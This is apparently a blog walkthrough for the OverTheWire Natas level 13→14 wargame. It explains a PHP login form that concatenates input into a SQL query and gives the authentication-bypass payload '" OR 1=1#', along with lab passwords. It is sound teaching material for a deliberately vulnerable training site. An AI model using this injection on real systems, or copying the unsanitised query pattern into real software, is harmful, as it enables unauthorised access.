---
layout: post-with-comments
title: "OverTheWire Natas Level 13 → 14 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-13-to-14/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, sql-injection]
description: "A step by step tutorial for OverTheWire Natas Level 13 → 14!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-12-to-13/' | relative_url }}">← Previous: Level 12 → 13</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas14.html" target="_blank" rel="noopener">
      Official (Level 14) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-14-to-15/' | relative_url }}">
      Next: Level 14 → 15 →
    </a>
  </div>
</nav>

## Login

URL: <http://natas14.natas.labs.overthewire.org>  
Credentials: **natas14: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ**

```bash
# Using curl (optional):
curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ http://natas14.natas.labs.overthewire.org/
````

---

## Task

This level provides a **login form** backed by a MySQL database. Looking at the source code reveals that user input is directly concatenated into a SQL query without sanitization.

---

## A little bit of Theory

Source snippet:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

Problems here:

* Inputs are **not sanitized or parameterized**.
* This enables **SQL Injection** — malicious SQL in the `username` or `password` fields can alter query logic.

Example:

```sql
SELECT * FROM users WHERE username="user" AND password="pass"
```

If we inject into `username` with:

```
" OR 1=1#
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username="" OR 1=1# " AND password="pass"
```

* `OR 1=1` is always true.
* `#` starts a comment, ignoring the rest.
* The query now **always returns rows**, bypassing authentication.

---

## Solution

1. **Open the login form**
   ![form]({{ '/assets/images/natas/level-13-to-14/form.jpg' | relative_url }})

2. **Inject into the username field**

   ```
   " OR 1=1#
   ```

   Password field can be anything (`abc`, `test`, doesn’t matter).

3. **Submit**

   The query is forced true, and you get:

   ```
   Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
   ```

   ![success]({{ '/assets/images/natas/level-13-to-14/success.jpg' | relative_url }})

---

## Password

```
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

---

**Troubleshooting**

* Still getting “Access denied”? → Double-check you typed the injection correctly, including quotes, spaces, and `#`.
* Query error? → Some shells auto-escape characters. Always inject directly in the **web form** (or URL encode if testing via curl).
* Blank page? → Try adding extra spaces after `#` so the comment consumes the remainder of the query.

---

**Congrats 🎉** You just performed a classic SQL Injection to bypass login and dumped the password for **natas15**. Next up is a trickier blind SQLi challenge.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

